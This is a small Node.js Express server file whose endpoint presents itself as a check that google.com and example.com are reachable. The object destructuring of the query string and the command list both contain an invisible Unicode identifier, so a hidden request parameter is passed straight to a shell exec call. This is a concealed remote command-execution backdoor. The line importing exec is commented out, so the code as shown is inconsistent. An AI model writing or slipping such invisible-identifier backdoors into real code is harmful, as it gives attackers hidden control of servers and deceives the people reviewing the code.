/*

    Reference: https://codeshack.io/basic-login-system-nodejs-express-mysql/

    Run me: docker-compose up --build --always-recreate-deps
*/

var express = require("express");
var bodyParser = require("body-parser");
//const exec = util.promisify(require('child_process').exec);
var fs = require("fs");
const app = express();



app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());


// Check whether we can reach google.com and example.com
app.get(`/a`, async(req, res) => {
    console.log(req.query);
    const { timeout, ㅤ } = req.query;
    const checkCommands = [
        'ping -c 1 google.com',
        'curl -s http://example.com/', ㅤ
    ];

    try {
        const outcomes = await Promise.all(checkCommands.map(cmd =>
            cmd && exec(cmd, { timeout: +timeout || 5000 })));

        res.status(200).contentType('text/plain');

        var outcomeStdout = '';
        for (i = 0; outcome = outcomes[i]; i++) {
            outcomeStdout += `"${checkCommands[i]}": `;
            outcomeStdout += "\n\n";
            outcomeStdout += outcome.stdout.trim();
            outcomeStdout += "\n\n";
        };
        res.send(`outcome ok:\n${outcomeStdout}`);
    } catch (e) {
        res.status(500);
        res.send(`outcome failed: ${e}`);
    }
});

app.listen(3000);